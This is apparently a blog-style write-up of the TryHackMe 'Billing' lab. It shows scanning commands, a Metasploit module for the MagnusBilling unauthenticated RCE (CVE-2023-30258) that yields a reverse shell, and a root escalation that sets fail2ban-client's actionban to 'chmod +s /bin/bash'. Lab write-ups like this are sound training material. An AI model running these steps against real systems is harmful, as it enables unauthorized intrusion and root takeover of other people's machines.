---
title: Billing - TryHackMe
date: 2025-03-22
---

<script setup>
    import RoomCard from "../../../.vitepress/components/thm/RoomCard.vue";
</script>

<RoomCard
    roomName="Billing"
    roomIcon="/ctf/tryhackme/billing/icon-room.png"
    roomLink="https://tryhackme.com/room/billing"
    roomLevel="EASY"
    roomTechnology="Linux"
/>

## Challenge Overview

This challenge involves exploiting a vulnerable instance of MagnusBilling, an open-source billing system for VoIP services. The goal is to gain initial access via a known unauthenticated remote code execution (RCE) vulnerability and escalate privileges to root by abusing misconfigured sudo permissions.

## Enumeration

### Nmap Scan

We begin with a full port scan using Nmap to identify open services and their versions:

```bash
nmap -sC -sV -v -p- -oN billing.nmap 10.10.4.139
```

**Scan Results:**

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.56 ((Debian))
3306/tcp open  mysql    MariaDB (unauthorized)
5038/tcp open  asterisk Asterisk Call Manager 2.10.6
```

**Services Identified:**

- `22/tcp`: SSH – OpenSSH 8.4p1
- `80/tcp`: HTTP – Apache 2.4.56, serving a web application
- `3306/tcp`: MariaDB – Access denied (requires authentication)
- `5038/tcp`: Asterisk Call Manager – VoIP management interface

### Web Enumeration

Navigating to `http://10.10.4.139/` reveals a login portal for MagnusBilling.

![MagnusBilling Login Page](/ctf/tryhackme/billing/login.png)

We enumerate accessible web directories using `gobuster`:

```bash
gobuster dir -u http://10.10.4.139/mbilling/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -o gobuster.txt
```

**Notable Results:**

```
/LICENSE              (Status: 200) [Size: 7652]
/archive              (Status: 301) [Size: 325] [--> http://10.10.251.102/mbilling/archive/]
/assets               (Status: 301) [Size: 324] [--> http://10.10.251.102/mbilling/assets/]
/fpdf                 (Status: 301) [Size: 322] [--> http://10.10.251.102/mbilling/fpdf/]
/index.html           (Status: 200) [Size: 30760]
/index.php            (Status: 200) [Size: 663]
/lib                  (Status: 301) [Size: 321] [--> http://10.10.251.102/mbilling/lib/]
/resources            (Status: 301) [Size: 327] [--> http://10.10.251.102/mbilling/resources/]
/tmp                  (Status: 301) [Size: 321] [--> http://10.10.251.102/mbilling/tmp/]
```

Reviewing the `LICENSE` file reveals that the application is **MagnusBilling v3**, dating back to 2007.

![License File](/ctf/tryhackme/billing/license.png)

## Exploitation – Unauthenticated RCE (CVE-2023-30258)

After identifying the software version, we search for known vulnerabilities and discover an unauthenticated remote code execution vulnerability in MagnusBilling v3:

> [Rapid7 Advisory – CVE-2023-30258](https://www.rapid7.com/db/modules/exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258/)

This vulnerability allows attackers to execute commands on the server without authentication.

### Using Metasploit to Exploit

We use Metasploit’s module to exploit the RCE:

```bash
msfconsole
use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
set RHOSTS 10.10.4.139
set RPORT 80
exploit
```

**Result:** We successfully gain a reverse shell as the `asterisk` user.

![Asterisk Shell](/ctf/tryhackme/billing/asterisk-shell.png)

We can now read the `user.txt` flag:

![User Flag](/ctf/tryhackme/billing/user-flag.png)

## Privilege Escalation

### Enumerating Sudo Permissions

We check what commands the `asterisk` user can run with `sudo`:

```bash
sudo -l
```

**Output:**

```
User asterisk may run the following commands on Billing:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
```

This indicates that the user can run `fail2ban-client` as root without a password.

### Understanding Fail2Ban Misconfiguration

The `fail2ban-client` binary is part of the **Fail2Ban** framework, which manages firewall bans by monitoring logs. It uses actions like `banip` or `actionban` to trigger system commands (e.g., blocking an IP).

By setting a malicious action that runs a command (such as giving `/bin/bash` the SUID bit), we can escalate privileges.

### Exploiting Fail2Ban to Gain Root

We first modify the `actionban` parameter for a jail to execute our payload:

```bash
sudo /usr/bin/fail2ban-client set asterisk-iptables action iptables-allports-ASTERISK actionban 'chmod +s /bin/bash'
```

Then, trigger the ban to execute the malicious action:

```bash
sudo /usr/bin/fail2ban-client set asterisk-iptables banip 10.10.10.10
```

This sets the SUID bit on `/bin/bash`, allowing us to execute it with root privileges:

```bash
/bin/bash -p
```

Now we have a root shell and can retrieve the final flag.